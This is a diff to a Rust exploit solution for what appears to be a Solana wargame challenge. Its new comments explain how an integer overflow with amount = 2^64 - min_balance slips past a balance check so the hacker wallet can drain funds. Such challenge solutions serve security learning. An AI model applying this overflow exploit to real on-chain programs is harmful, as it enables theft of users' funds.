@@ -42,9 +42,13 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
     let hacker_wallet =
         level2::get_wallet_address(_challenge.hacker.pubkey(), _challenge.wallet_program);
 
-    // need to pass min_balance + amount <= hacker_wallet.lamports = 0
-    // i.e. min_balance + amount = 0 (RHS cannot be overflowed)
-    // i.e. set amount = -min_balance
+    // need to pass min_balance + amount <= hacker_wallet.lamports
+    // RHS cannot be overflowed, so need to overflow LHS
+    // at the same time amount needs to be minimized because it'll lead to a higher gain
+    // due to how 2s complement numbers work (MAX_UINT = -1, MAX_UINT - 1 = -2, ...)
+    // therefore, two constraints:
+    // 1) overflow LHS, i.e. amount >= 2^64 - min_balance 2) minimize amount
+    // meaning amount = 2^64 - min_balance is optimal
     let min_balance = Rent::default().minimum_balance(8);
     println!("Min balance: {}", min_balance);
     let overflow = (-(min_balance as i64)) as u64;
@@ -74,6 +78,7 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
             // need it a second time so the actual withdraw below can pass the min_balance + amount <= wallet_info.lamports assert
             create_hack_instr(1),
             // might need it several more times such that hacker_balance > 1 SOL test passes because we also paid gas
+            // everytime our balance increases by -= -min_balance, i.e., +min_balance
             create_hack_instr(2),
         ],
         &[&_challenge.hacker],
@@ -81,6 +86,7 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
     tx.print_named("Hack: hacker overflow");
 
     // withdraw from our wallet
+    // may only withdraw hacker_profit (not sure why current_balance - min_balance fails)
     hacker_profit = _env.get_account(hacker_wallet).unwrap().lamports - hacker_profit;
     println!("Hacker profit: {}", hacker_profit);
     let tx = _env.execute_as_transaction(
